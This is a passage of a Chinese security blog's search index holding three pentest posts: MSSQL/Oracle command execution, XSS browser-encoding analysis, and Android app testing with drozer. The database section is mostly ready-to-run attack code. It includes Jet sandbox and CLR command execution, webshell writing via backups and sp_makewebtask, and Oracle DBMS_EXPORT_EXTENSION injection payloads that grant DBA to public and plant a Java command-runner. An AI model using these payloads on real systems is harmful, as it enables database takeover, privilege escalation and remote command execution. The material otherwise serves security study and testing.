Procedures&#39;,1;RECONFIGURE;</code></p>\n<h3 id=\"jet沙盒\"><a href=\"#jet沙盒\" class=\"headerlink\" title=\"jet沙盒\"></a>jet沙盒</h3><p>运行命令</p>\n<p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database=c:\\windows\\system32\\ias\\ias.mdb’,’select shell(“CMD命令”)’)</p>\n<p><strong>激活沙盒</strong></p>\n<p><strong>SQL Server2008 默认未注册microsoft.jet.oledb.4.0接口,所以无法利用沙盒模式执行系统命令.</strong></p>\n<p>exec master..xp_regwrite’HKEY_LOCAL_MACHINE’,’SOFTWARE\\Wow6432Node\\Microsoft\\Jet\\4.0\\Engines’ ,’SandBoxMode’,’REG_DWORD’,0; </p>\n<h3 id=\"CLR执行\"><a href=\"#CLR执行\" class=\"headerlink\" title=\"CLR执行\"></a>CLR执行</h3><p>MsSql使用CLR存储过程，CLR是一个类似JAVA虚拟机的环境，Mssql2005后可以调用CLR过程来加载一些函数。</p>\n<p><strong>第一步</strong></p>\n<p>编写代码编译成DLL文件，<a href=\"https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v\" target=\"_blank\" rel=\"noopener\">代码参考</a></p>\n<p><strong>第二步</strong></p>\n<p>开启CLR</p>\n<p>sp_configure ‘clr enabled’,1;RECONFIGURE;GO</p>\n<p><strong>第三步</strong></p>\n<p>创建存储过程</p>\n<p>– 装载DLL文件</p>\n<p>CREATE ASSEMBLY my_assembly FROM ‘c:\\temp\\cmd_exec.dll’;WITH PERMISSION_SET = UNSAFE;Go</p>\n<p>– 链接</p>\n<p>CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];GO</p>\n<p>cmd_exec ‘cmd’执行命令。</p>\n<p><strong>如果遇到权限问题请执行</strong></p>\n<p> alter database [数据库名] set TRUSTWORTHY on EXEC sp_changedbowner ‘sa’</p>\n<h2 id=\"备份法\"><a href=\"#备份法\" class=\"headerlink\" title=\"备份法\"></a>备份法</h2><h3 id=\"差异备份\"><a href=\"#差异备份\" class=\"headerlink\" title=\"差异备份\"></a>差异备份</h3><p>差异备份法webshell过大。</p>\n<p><code>backup database 库名 to disk = &#39;路径&#39;;\ncreate table [dbo].[test_tmp] ([cmd] [image]);\ninsert into  test_tmp(cmd) values(&#39;webshell&#39;);\nbackup database 库名 to disk=&#39;路径&#39; WITH DIFFERENTIAL,FORMAT;</code></p>\n<h3 id=\"sp-makewebtask备份\"><a href=\"#sp-makewebtask备份\" class=\"headerlink\" title=\"sp_makewebtask备份\"></a>sp_makewebtask备份</h3><p><code>exec sp_makewebtask &#39;c:\\shell.asp&#39;,&#39; select &#39;&#39;&lt;%25execute(request(&quot;a&quot;))%25&gt;&#39;&#39; &#39;;</code></p>\n<p>默认2005禁止，激活存储过程。</p>\n<p><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Web Assistant Procedures&#39;,1;RECONFIGURE;</code></p>\n<h3 id=\"log备份法\"><a href=\"#log备份法\" class=\"headerlink\" title=\"log备份法\"></a>log备份法</h3><p>相对差异备份法shell就很小。</p>\n<p>第一步<code>alter database asp_test set RECOVERY FULL</code>激活mssql为还原模式。</p>\n<p>其他后面步骤一样。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v\" target=\"_blank\" rel=\"noopener\">安恒一篇关于mssql利用的总结</a></p>\n<h1 id=\"oracle\"><a href=\"#oracle\" class=\"headerlink\" title=\"oracle\"></a>oracle</h1><p>oracle是一个庞大的数据库，普遍用于大公司，oracle也十分繁琐。</p>\n<p>oracle系统库默认的用户有sys,system,internal,scott,前三个权限都是system权限，</p>\n<p>在 Oracle 的存储过程中，有一个有趣的特点：运行权限。运行权限分为两种，definer 和 invoker。definer 为函数创建者的权限，而 invoker 则是当前调用函数的用户。运行权限在函数创建时就已经被钦定了，<strong>默认definer</strong>。</p>\n<p>由于这种特性我们就有了很多操作空间了。</p>\n<p><strong>oracle不同于mysql，oracle注入一定要带上表名，如果没有可以使用虚表dual。</strong></p>\n<p>数据库中任何一个用户都默认拥有 public 角色，我们对pulic角色操作就能很方便的对自己角色操作。</p>\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><p>这里我也没怎么遇到过oracle数据库经验不足，这些都是看<a href=\"https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/\" target=\"_blank\" rel=\"noopener\">别人博客</a>边看边抄来的，暂时没时间研究，好久自己搭环境研究下如果有错再来修改。</p>\n<h3 id=\"GET-DOMAIN-INDEX-TABLES\"><a href=\"#GET-DOMAIN-INDEX-TABLES\" class=\"headerlink\" title=\"GET_DOMAIN_INDEX_TABLES\"></a>GET_DOMAIN_INDEX_TABLES</h3><p>在10g中GET_DOMAIN_INDEX_TABLES 函数存在注入漏洞，该函数位于 DBMS_EXPORT_EXTENSION 包中，执行权限隶属于 sys。</p>\n<p><strong>版本：</strong></p>\n<p><strong>Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</strong></p>\n<p>这个类似于CLR执行需要加载Java包，里面创建执行命令函数。具体怎么编写java也不是很懂，这里抄的大佬的代码</p>\n<p><strong>提权到dba角色。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;grant dba to public&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建JAVA库</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>赋予java权限</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;begin dbms_java.grant_permission(&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;PUBLIC&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS:java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&lt;&gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;);end;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;LinxUtil.runCMD(java.lang.String) return String&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>赋予函数执行权限</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;grant all on LinxRunCMD to public&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>\n\n<p><strong>执行</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select sys.LinxRunCMD(&apos;/bin/bash -c /usr/bin/whoami&apos;) from dual</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"dbms-xmlquery-newcontext\"><a href=\"#dbms-xmlquery-newcontext\" class=\"headerlink\" title=\"dbms_xmlquery.newcontext\"></a>dbms_xmlquery.newcontext</h3><p>这里也需要DBMS_EXPORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功</p>\n<p><strong>版本：</strong></p>\n<p>Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</p>\n<p><strong>创建java包</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &apos;&apos;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&apos;&apos;;commit;end;&apos;) from dual;</span><br></pre></td></tr></table></figure>\n\n<p><strong>赋予java权限</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;begin dbms_java.grant_permission(&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;YY&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS:java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&lt;&lt;ALL FILES&gt;&gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;);end;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual;</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &apos;&apos;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &apos;&apos;&apos;&apos;LinxUtil.runCMD(java.lang.String) return String&apos;&apos;&apos;&apos;; &apos;&apos;;commit;end;&apos;) from dual;</span><br></pre></td></tr></table></figure>\n\n<p><strong>执行命令</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select LinxRunCMD(&apos;id&apos;) from dual</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"DBMS-JAVA-TEST-FUNCALL\"><a href=\"#DBMS-JAVA-TEST-FUNCALL\" class=\"headerlink\" title=\"DBMS_JAVA_TEST.FUNCALL\"></a>DBMS_JAVA_TEST.FUNCALL</h3><p><strong>版本：</strong></p>\n<p>10g R2, 11g R1, 11g R2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (Select DBMS_JAVA_TEST.FUNCALL (‘oracle/aurora/util/Wrapper’,&apos;main’,&apos;c:\\\\windows\\\\system32\\\\cmd.exe’,&apos;/c’,&apos;dir&gt;c:\\\\OUT2.LST’) FROM DUAL)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"DBMS-JAVA-RUNJAV\"><a href=\"#DBMS-JAVA-RUNJAV\" class=\"headerlink\" title=\"DBMS_JAVA.RUNJAV\"></a>DBMS_JAVA.RUNJAV</h3><p><strong>版本：</strong></p>\n<p>11gR1,11gR2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (SELECT DBMS_JAVA.RUNJAVA (‘oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c dir&gt;C:\\\\OUT.LST’) FROM DUAL)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://www.4hou.com/technology/3338.html\" target=\"_blank\" rel=\"noopener\">https://www.4hou.com/technology/3338.html</a></p>\n<p><a href=\"https://www.cnblogs.com/R4v3n/articles/9072549.html#menu_index_7\" target=\"_blank\" rel=\"noopener\">mssql执行命令大全</a></p>\n","categories":[],"tags":[]},{"title":"xss研究之浏览器编码探究","url":"http://yoursite.com/2019/08/15/xss研究之浏览器编码探究/","content":"<p><strong>以下是根据网上文章字节理解整理的一篇文章，可能存在错误，&lt;__&gt;有错你也打不到我</strong></p>\n<h1 id=\"浏览器解码规则\"><a href=\"#浏览器解码规则\" class=\"headerlink\" title=\"浏览器解码规则\"></a>浏览器解码规则</h1><p><img src=\"/2019/08/15/xss研究之浏览器编码探究/1565924892380.png\" alt=\"图1\"></p>\n<p>说到浏览器规则便用这一张图来简单阐述。</p>\n<p>首先生成html和css的DOM树和CSSOM树，当遇到script时会中断DOM树的创建。了解浏览器渲染流程可以参考链接<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">html渲染</a>。</p>\n<h1 id=\"html解析器\"><a href=\"#html解析器\" class=\"headerlink\" title=\"html解析器\"></a>html解析器</h1><p>html渲染生成DOM树时&lt;且后面无/就进入”标签开始状态“，然后匹配到标签转变到“标签名状态”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签也就是匹配到“&gt;”，就会释放出一个token。</p>\n<p>也就是说我们是不能使用<code>&amp;#60;&amp;#62;</code>(&lt;&gt;)这样的实体来标识一个html标签这是不会被执行的，因为解析<code>&amp;#60;&amp;#62;</code>并不会进入标签开始状态，我们无法使用标签名的实体来绕过过滤，实际上标签名不能进行任何编码。</p>\n<h1 id=\"js解析器\"><a href=\"#js解析器\" class=\"headerlink\" title=\"js解析器\"></a>js解析器</h1><p>js编码是使用<code>\\uXXXX</code>这种写法为<code>Unicode</code>转义序列。js触发有<code>script</code>、on*时间和伪协议。</p>\n<h2 id=\"script\"><a href=\"#script\" class=\"headerlink\" title=\"script\"></a>script</h2><p><strong>script有个有趣的属性在块中的字符引用实体不会被解析和解码</strong>，也就是说<code>script</code>标签中不能使用实体编码来编码函数等。但能处理js编码但js编码不能编码引号等字符因为这样便无法执行xss。</p>\n<h2 id=\"on-事件\"><a href=\"#on-事件\" class=\"headerlink\" title=\"on*事件\"></a>on*事件</h2><p>思考两行代码<code>&lt;img src=1 onerror=ale\\u0072t(1)&gt;</code>和<code>&lt;img src=1 oner\\u0072or=alert(1)&gt;</code>两行代码</p>\n<p>会发现第一个代码弹框第二个代码未弹框,这是因为浏览器在处理到<code>onerror</code>时便调用js解析器但对于<code>oner\\u0072or</code>浏览器并不会调用js解析器，我们无法对onerror事件编码，因为这样html解析器不认识这个onerror事件就不会将他交给js解析器，浏览器在调用on事件时其实调用的对应on函数,具体处理可以看大佬调试ie的<a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">文章</a></p>\n<h2 id=\"伪协议\"><a href=\"#伪协议\" class=\"headerlink\" title=\"伪协议\"></a>伪协议</h2><p><img src=\"/2019/08/15/xss研究之浏览器编码探究/1565935108396.png\" alt=\"1565935108396\"></p>\n<p>上面的代码放到浏览器能弹框，为什么对javascript进行实体还能弹框呢？首先浏览器对代码进行html解码</p>\n<p><img src=\"/2019/08/15/xss研究之浏览器编码探究/1565935142519.png\" alt=\"1565935142519\"></p>\n<p>之后这里多了一层调用url解析器,url解析器去识别了javascript伪协议，<strong>注意url解析不能识别任何编码后的协议类型</strong>这里是由于html解码发生在url解析前所以才能解析。最后url解析器解析了</p>\n<p>%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30</p>\n<p>%30%37%32%5c%75%30%30%37%34</p>\n<p>再由js解析器解析。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>对于html标签属性进行了编码便不会被识别。</p>\n<p>&#60;script&#62;标签不能使用js编码外的其他js解释器不识别的编码，script标签中的内容会原封不动的给js去执行。</p>\n<p>on*事件是调用的js函数，html编码处理发生在给JS解析器之前。</p>\n<p>伪协议能对url和html解析，实体和URL编码的处理发生在交给js解析器之前。</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://security.yirendai.com/news/share/26\" target=\"_blank\" rel=\"noopener\">https://security.yirendai.com/news/share/26</a></p>\n<p><a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/1556</a></p>\n<p><a href=\"https://www.yuque.com/kkdlong/eiwne5/fpl8ob?language=en-us\" target=\"_blank\" rel=\"noopener\">https://www.yuque.com/kkdlong/eiwne5/fpl8ob?language=en-us</a></p>\n","categories":[],"tags":["xss","编码"]},{"title":"安卓基础检测","url":"http://yoursite.com/2018/03/02/安卓反编译与打包/","content":"<h2 id=\"工具、环境准备\"><a href=\"#工具、环境准备\" class=\"headerlink\" title=\"工具、环境准备\"></a>工具、环境准备</h2><p>1.java环境安装  </p>\n<p>2.apktool</p>\n<p>3.drozer安装，<a href=\"https://www.cnblogs.com/lsdb/p/9441813.html\" target=\"_blank\" rel=\"noopener\">安装教程</a></p>\n<h2 id=\"反编译与打包\"><a href=\"#反编译与打包\" class=\"headerlink\" title=\"反编译与打包\"></a>反编译与打包</h2><p>使用apktool将apk再反编译成文件(以下app名字为forinfor.apk,)<br><code>java -jar apktool.jar d -f forinfor.apk -o forinfor</code></p>\n<p>再将文件夹重新编译为apk文件</p>\n<p><code>apktool b forinfor -o newforinfor.apk</code></p>\n<p>再生成对应的签名文件</p>\n<p><code>keytool -genkeypair -v -keystore xample.keystore -alias test(这里是签名的别名) -keyalg RSA</code></p>\n<p><code>-keysize2048 -validity 10000</code></p>\n<p>完成签名文件的信息填写之后再用签名文件打包(这里如果出现乱码输入<strong>chcp 936</strong>)</p>\n<p><code>jarsigner -keystore xample.keystore -digestalg SHA1 -sigalg SHA1withRSA newforinfor.apk</code></p>\n<p><code>test(别名)</code></p>\n<h3 id=\"启动mobsf\"><a href=\"#启动mobsf\" class=\"headerlink\" title=\"启动mobsf\"></a>启动mobsf</h3><h1 id=\"组件测试\"><a href=\"#组件测试\" class=\"headerlink\" title=\"组件测试\"></a>组件测试</h1><p>安卓有四大组件activity,service,broadcast receiver,content provider。activity组件就是我们常规看到的页面，app的每个页面都可以看作一个activity组件。service就是没有页面的服务，提供运算支持。broadcast receiver是对系统的广播，content provider是处理手机数据库的组件，用于存取数据。</p>\n<p>安装完drozer之后,在Android启动drozer的app，打开端口监听。</p>\n<p><code>adb forward tcp:31415 tcp:31415</code>端口转发。</p>\n<p><code>drozer.bat console connect</code>启动drozer,<strong>注意这里需要在drozer安装目录中启动drozer不然在运行一些命令会报错。</strong></p>\n<p><code>run app.package.list</code>查看模拟器安装的app名。这里看不见的话可以使用adb shell到Android安装目录/data/app查看,/data/data里也能看到包名，这是程序的数据存放目录。</p>\n<p>注:以下组件调用可能存在本地拒绝服务攻击。</p>\n<h2 id=\"Activity\"><a href=\"#Activity\" class=\"headerlink\" title=\"Activity\"></a>Activity</h2><p><code>run app.activity.info -a 包名</code>这里就会显示出所有可调用的包名。</p>\n<p><code>run app.activity.start --component 包名 组件名</code>这里主要是看通过调用组件能否调用一些敏感信息功能页面。</p>\n<h2 id=\"service\"><a href=\"#service\" class=\"headerlink\" title=\"service\"></a>service</h2><p><code>run app.service.info -a 包名</code>这里是可以查看可调用的服务名。</p>\n<p><code>run app.service.start --action 服务名 --component 包名 服务名</code>调用服务组件</p>\n<h2 id=\"broadcast\"><a href=\"#broadcast\" class=\"headerlink\" title=\"broadcast\"></a>broadcast</h2><p><code>run app.broadcast.info -a 包名</code>这里是可以查看可调用的广播名。</p>\n<p><code>run app.broadcast.send --component 包名 广播名 --extra string phoneNumber 222</code>查看恶意广播</p>\n<p><code>run app.broadcast.send --component 包名 广播名</code>本地DOS检测</p>\n<h2 id=\"Content\"><a href=\"#Content\" class=\"headerlink\" title=\"Content\"></a>Content</h2><p><code>run scanner.provider.injection -a 包名</code>检测sql注入</p>\n<p><code>run scanner.provider.traversal -a 包名</code>检测目录遍历漏洞</p>\n<p><code>run app.provider.read Content泄露组件名 文件目录</code>查看本机中的文件</p>\n<p><code>run app.provider.read Content组件名 /etc/hosts</code>查看本机的域名配置文件</p>\n<h1 id=\"WebView组件\"><a href=\"#WebView组件\" class=\"headerlink\" title=\"WebView组件\"></a>WebView组件</h1><h2 id=\"WebView代码执行检测\"><a href=\"#WebView代码执行检测\" class=\"headerlink\" title=\"WebView代码执行检测\"></a>WebView代码执行检测</h2><p>webview代码执行主要是由于低版本安卓上addJavascriptInterface功能无限制，当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p>\n<h4 id=\"Android-4-2版本之后\"><a href=\"#Android-4-2版本之后\" class=\"headerlink\" title=\"Android 4.2版本之后\"></a>Android 4.2版本之后</h4><p>Google 在Android 4.2 版本中规定对被调用的函数以 <code>@JavascriptInterface</code>进行注解从而避免漏洞攻击。</p>\n<h4 id=\"Android-4-2版本之前\"><a href=\"#Android-4-2版本之前\" class=\"headerlink\" title=\"Android 4.2版本之前\"></a>Android 4.2版本之前</h4><p>重写JavascriptInterface方法</p>\n<p><strong>searchBoxJavaBridge_、accessibility和 accessibilityTraversal组件在低版本也存在任意代码执行。</strong></p>\n<h2 id=\"WebView不校验证书检测\"><a href=\"#WebView不校验证书检测\" class=\"headerlink\" title=\"WebView不校验证书检测\"></a>WebView不校验证书检测</h2><p>搜索onReceivedSslError，调用了process()方法的话就会忽略掉证书的错误继续执行。</p>\n<h2 id=\"域控制不严格漏洞\"><a href=\"#域控制不严格漏洞\" class=\"headerlink\" title=\"域控制不严格漏洞\"></a>域控制不严格漏洞</h2><p>通过使用恶意代码来读取本地文件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setAllowFileAccess(false); //禁用file协议读取</span><br><span class=\"line\">setAllowFileAccessFromFileURLs(false);</span><br><span class=\"line\">setAllowUniversalAccessFromFileURLs(false);</span><br></pre></td></tr></table></figure>\n\n<p>即使禁用依旧可以通过<strong>符号链接跨源攻击</strong>，<strong>通过 javascript 的延时执行和将当前文件替换成指向其它文件的软链接就可以读取到被符号链接所指的文件</strong></p>\n<h2 id=\"ios\"><a href=\"#ios\" class=\"headerlink\" title=\"ios\"></a>ios</h2><p>安装目录</p>\n<p>/private/var/containers/Bundle/Application</p>\n<p>/private/var/mobile/Containers/Bundle/Application/</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://www.jianshu.com/p/3a345d27cd42\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/3a345d27cd42</a></p>\n<p><a href=\"https://www.cnblogs.com/laughingQing/p/6392455.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/laughingQing/p/6392455.html</a></p>\n","categories":[],"tags":[]},{"title":"文章分类","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]},{"title":"tags","url":"http://yoursite.com/tags/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]}]